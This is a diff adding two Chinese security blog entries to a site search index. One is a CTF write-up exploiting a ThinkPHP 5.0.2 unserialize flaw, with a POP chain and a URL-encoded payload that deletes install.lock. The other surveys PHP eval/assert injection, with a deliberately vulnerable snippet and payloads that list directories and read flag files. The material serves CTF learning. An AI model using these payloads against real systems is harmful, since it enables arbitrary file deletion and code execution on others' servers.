@@ -4916,4 +4916,105 @@ os.path.dirname(path):返回文件路径</code></pre>
         <tag>刷题</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ctfshow1</title>
+    <url>/2021/09/23/ctfshow1/</url>
+    <content><![CDATA[<h1 id="eztp"><a href="#eztp" class="headerlink" title="eztp"></a>eztp</h1><p>打开容器，发现源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">$run=[]</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Welcome to CTFSHOW&lt;/h1&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Powered by PHPthink5.0.2&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> dirname(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($run[<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;ZmxhZyBpcyBub3QgaGVyZSBidXQgaXQgaXMgaW4gZmxhZy50eHQ=&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($run[<span class="number">1</span>]))&#123;</span><br><span class="line">            unserialize($run[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// hint:/index/index/backdoor</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../../&#x27;</span>.<span class="string">&quot;install.lock&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Try to post CMD arguments&quot;</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">            $data = input(<span class="string">&#x27;post.&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,$data[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                $cmd = escapeshellarg($data[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        $cmd=<span class="string">&#x27;cat &#x27;</span>.$cmd;</span><br><span class="line">        <span class="keyword">echo</span> $cmd;</span><br><span class="line">                system($cmd);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No No No&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../../&#x27;</span>.<span class="string">&quot;install.lock has not been deleted&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="一-前期摸索"><a href="#一-前期摸索" class="headerlink" title="一.前期摸索"></a>一.前期摸索</h3><p>​       我们看到源码中有个hint，试着访问，但是没有跳转，由于我之前没有接触thinhkphp框架，我就不懂的怎么利用这两个函数。</p>
+<p>​       对那段base64的字符串解码：<img src="/2021/09/23/ctfshow1/image-20210924184829871.png" alt="image-20210924184829871"></p>
+<p>但是flag.txt没办法直接访问，看看后面有没有用</p>
+<p>这里第二个if语句有一个unserialize函数，但是要怎么利用呢？</p>
+<h3 id="二-考点知识"><a href="#二-考点知识" class="headerlink" title="二.考点知识"></a>二.考点知识</h3><ul>
+<li><strong>tp框架下的操作方法调用</strong></li>
+</ul>
+<p>一个典型的控制器类 定义如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>控制器类文件的实际位置是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">application\index\controller\Index.php</span><br></pre></td></tr></table></figure>
+
+<p>因此index.php作为tp框架的入口文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当控制器类的定义如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,world!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">data</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;thinkphp&#x27;</span>,<span class="string">&#x27;status&#x27;</span>=&gt;<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要想访问这两个不同的操作方法构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;index&#x2F;Index&#x2F;hello</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;index&#x2F;Index&#x2F;data</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>tp框架下的反序列化漏洞</strong></li>
+</ul>
+<p>漏洞起点在<code>\thinkphp\library\think\process\pipes\windows.php</code>的__destruct魔法函数：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进removeFiles()函数：<img src="/2021/09/23/ctfshow1/image-20210924190059999.png" alt="image-20210924190059999"></p>
+<p>可以看到有一个unlink函数，而这里的文件名我们是可以控制的，因此这里存在一个任意文件删除的漏洞，构造payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">private</span> $files=[];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="string">&#x27;想要删出的文件&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="三-思路构建"><a href="#三-思路构建" class="headerlink" title="三.思路构建"></a>三.思路构建</h3><p>访问操作方法backdoor：</p>
+<p><img src="/2021/09/23/ctfshow1/image-20210924193320606.png" alt="image-20210924193320606"></p>
+<p>看来我们要先删除这个install.lock文件</p>
+<p>构造pop链：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">private</span> $files=[];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="string">&#x27;/var/www/html/application/index/controller/../../install.lock&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?run[1]&#x3D;O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A61%3A%22%2Fvar%2Fwww%2Fhtml%2Fapplication%2Findex%2Fcontroller%2F..%2F..%2Finstall.lock%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后再访问操作方法backdoor即可：</p>
+<p><img src="/2021/09/23/ctfshow1/image-20210924195147709.png" alt="image-20210924195147709"></p>
+<p>接着我们通过抓包post参数：</p>
+<p><img src="/2021/09/23/ctfshow1/image-20210924200414729.png" alt="image-20210924200414729"></p>
+<p>这里要注意的是由于经过escapeshellarg()作用，参数字符串被增加一个单引号并且能引用或者转码任何已经存在的单引号，变成可以在 shell 命令里使用的参数。</p>
+<p>因此这里我们就不能利用通配符绕过flag关键字，但是我们可以用不可打印字符来绕过。</p>
+]]></content>
+      <tags>
+        <tag>刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP任意代码执行漏洞</title>
+    <url>/2021/09/25/PHP%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="一-常见函数"><a href="#一-常见函数" class="headerlink" title="一.常见函数"></a>一.常见函数</h2><p>php: <code>eval,assert</code></p>
+<p>python: <code>exec</code></p>
+<p><strong>eval和assert的区别：</strong></p>
+<p>eval()的参数是字符（字符串），而且必须是标准的php语句才会执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(&#39;echo 1;&#39;&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>assert()的参数是表达式（或函数）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert(phpinfo());</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><p><strong>1.eval()：</strong></p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以这样利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">扫描当前目录，并打印：?a&#x3D;var_dump(scandir(&#39;.&#x2F;&#39;));</span><br><span class="line"></span><br><span class="line">扫描根目录，并打印：?a&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));</span><br><span class="line"></span><br><span class="line">glob() 函数返回匹配指定模式的文件名或目录。举个例子:</span><br><span class="line">glob(&quot;*&quot;) 匹配当前目录下的任意文件</span><br><span class="line">glob(&quot;*.txt&quot;)匹配以txt为后缀的文件</span><br><span class="line">打印当前目录下的所有文件：?a&#x3D;var_dump(glob(&quot;*&quot;));</span><br><span class="line"></span><br><span class="line">读取flag文件：?a&#x3D;highlight_file(&#39;flag.php&#39;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>2.assert()：</strong></p>
+<p>源码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$poc&#x3D;&quot;a#s#s#e#r#t&quot;; </span><br><span class="line">$poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; </span><br><span class="line">$poc_2($_GET[&#39;s&#39;]) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以这样利用</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">扫描当前目录：http:<span class="comment">//123.206.87.240:8010/?s=var_dump(scandir(&#x27;./&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>总结</tag>
+      </tags>
+  </entry>
 </search>
